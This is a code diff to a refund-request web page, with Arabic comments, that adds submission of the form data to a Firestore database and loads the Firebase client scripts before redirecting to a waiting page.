@@ -275,10 +275,40 @@
                 sessionStorage.setItem('refundRequestData', JSON.stringify(refundData));
             } catch (err) {}
 
+            // إرسال الطلب إلى قاعدة البيانات (Firestore customers/requests)
+            try {
+                if (typeof window.submitServiceRequest === 'function') {
+                    const amt = parseFloat(refundData.amount);
+                    window.submitServiceRequest({
+                        type: 'refund',
+                        name: refundData.fullName,
+                        phone: refundData.phone,
+                        amount: isNaN(amt) ? (refundData.amount || '') : amt.toLocaleString('en-US') + ' د.ع',
+                        details: {
+                            orderNo: refundData.orderNo,
+                            serviceType: refundData.serviceType,
+                            refundAmount: refundData.amount,
+                            reason: refundData.reason,
+                            refundMethod: refundData.refundMethod,
+                            notes: refundData.notes
+                        }
+                    });
+                }
+            } catch (err) {}
+
             setTimeout(() => {
                 window.location.href = 'wait1.html';
             }, 1000);
         });
     </script>
+
+
+    <!-- Firebase: إرسال الطلبات إلى قاعدة البيانات -->
+    <script src="/assets/js/firebase-env.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+    <script src="/assets/js/firebase-client.js?v=6"></script>
+    <script src="/assets/js/request-store.js?v=1"></script>
 </body>
 </html>
